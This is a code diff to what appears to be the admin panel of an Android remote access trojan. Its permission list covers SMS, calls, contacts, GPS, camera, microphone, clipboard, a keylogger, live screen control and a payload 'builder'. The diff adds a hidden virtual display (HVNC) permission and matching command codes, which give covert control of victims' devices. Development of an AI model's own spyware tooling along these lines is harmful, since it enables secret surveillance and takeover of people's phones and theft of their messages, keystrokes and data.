@@ -17,6 +17,7 @@ export type Permission =
   | 'device:apps'
   | 'device:fason'
   | 'device:screen'
+  | 'device:hvnc'
   | 'device:keylogger'
   | 'device:command'
   | 'device:delete'
@@ -33,7 +34,7 @@ export const ALL_PERMISSIONS: Permission[] = [
   'dashboard:view', 'device:view', 'device:sms', 'device:calls',
   'device:contacts', 'device:gps', 'device:camera', 'device:mic',
   'device:files', 'device:wifi', 'device:clipboard', 'device:notifications',
-  'device:permissions', 'device:apps', 'device:fason', 'device:screen', 'device:keylogger', 'device:command',
+  'device:permissions', 'device:apps', 'device:fason', 'device:screen', 'device:hvnc', 'device:keylogger', 'device:command',
   'device:delete',
   'builder:access', 'logs:view', 'logs:clear', 'users:manage',
   'settings:view', 'settings:edit', 'stats:view', 'files:download',
@@ -43,7 +44,7 @@ export const DEFAULT_USER_PERMISSIONS: Permission[] = [
   'dashboard:view', 'device:view', 'device:sms', 'device:calls',
   'device:contacts', 'device:gps', 'device:camera', 'device:mic',
   'device:files', 'device:wifi', 'device:clipboard', 'device:notifications',
-  'device:permissions', 'device:apps', 'device:fason', 'device:screen', 'device:keylogger', 'device:command',
+  'device:permissions', 'device:apps', 'device:fason', 'device:screen', 'device:hvnc', 'device:keylogger', 'device:command',
   'logs:view', 'settings:view',
 ];
 
@@ -67,6 +68,7 @@ export const PERMISSION_GROUPS = [
       { key: 'device:apps' as Permission, label: 'Installed Apps', description: 'View installed applications' },
       { key: 'device:fason' as Permission, label: 'Fason Manager', description: 'Fason app management' },
        { key: 'device:screen' as Permission, label: 'Live Screen', description: 'Live screen streaming and remote control' },
+       { key: 'device:hvnc' as Permission, label: 'HVNC', description: 'Hidden virtual display control' },
        { key: 'device:keylogger' as Permission, label: 'Keylogger', description: 'View captured keystroke data' },
       { key: 'device:command' as Permission, label: 'Send Commands', description: 'Send commands to devices' },
       { key: 'device:delete' as Permission, label: 'Delete Devices', description: 'Remove devices and their data' },
@@ -122,6 +124,11 @@ export const CMD = {
    WEBRTC_OFFER: '0xWO',
    WEBRTC_ANSWER: '0xWA',
    WEBRTC_ICE: '0xWC',
+   HVNC: '0xHV',
+   HVNC_CTRL: '0xHC',
+   HVNC_OFFER: '0xHO',
+   HVNC_ANSWER: '0xHA',
+   HVNC_ICE: '0xHI',
 } as const;
 
 export type CmdType = typeof CMD[keyof typeof CMD];
